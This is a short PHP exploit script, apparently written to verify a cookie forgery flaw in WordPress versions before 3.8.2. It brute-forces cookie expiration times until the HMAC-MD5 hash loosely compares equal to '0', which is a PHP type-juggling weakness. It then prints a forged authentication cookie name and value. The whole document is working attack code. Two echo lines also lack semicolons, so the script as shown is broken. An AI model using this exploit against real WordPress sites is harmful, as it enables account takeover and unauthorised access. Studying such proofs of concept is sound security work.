<?php
/**
* A script to verify (local) WordPress < 3.8.2 cookie forgery vulnerability
* Author:	Ettack
* Email:	ettack@gmail.com
*/

$site_url = 'http://www.ettack.org';	//Used for generating cookie key: 'wordpress_'+hash($site_url)
$user = 'ettack';
$pass_frag = '1234';	//Fragment of your password hash. $pass_frag = substr($user->user_pass, 8, 4)
$scheme = '';

$unit = 100000000;
$init = empty($argv[1])?0:$argv[1]*$unit;		//Start point. e.g. 2 for 200000000
$exptime = 1400000000+$init;
$cnt = 0+$init;
$max = $init + $unit;

function gen_cookie($site_url,$user,$exptime,$pass_frag,$scheme) {
	$lk = 'E..y-UBzte>Ddu^pF~kFsCPd6zD)%gar?0lBPiki9Kg_M`^<b3&`PtowYZ6V/1sU';	//$auth_key configured in wp-config.php
	$ls = '()_m._cRk}-Uj|tZ9GEZXJFJ}Ab+AT}:T!ug{I*o`PmmJ`4~/ry^:y0H$g:.fpm}';	//$auth_salt configured in wp-config.php

	$key = hash_hmac('md5',$user.$pass_frag.'|'.$exptime,$lk.$ls);
	$hash = hash_hmac('md5',$user.'|'.$exptime,$key);

	return $hash;
}


while ($cnt<$max) {
	$cnt++;
	$exptime++;
	if ($cnt % 10000 == 0) { 
		echo "\rTrying:  ".$exptime;	//real-time status output
	}
	$hs = gen_cookie($site_url,$user,$exptime,$pass_frag,$scheme);
	//when "zero hash" found, output and exit
	if ($hs == "0") {
		echo "\n\nAfter ".$cnt." tries, we found: \n";
		echo "Expiration: ".$exptime."\n";
		echo "Hash: ".$hs."\n";
		echo "Cookie Key: ".'wordpress'.$scheme.md5($site_url).'\n'
		echo "Cookie Value: ".$user.'|'.$exptime.'|'.$hs.'\n'
		break;
	}
}
?>
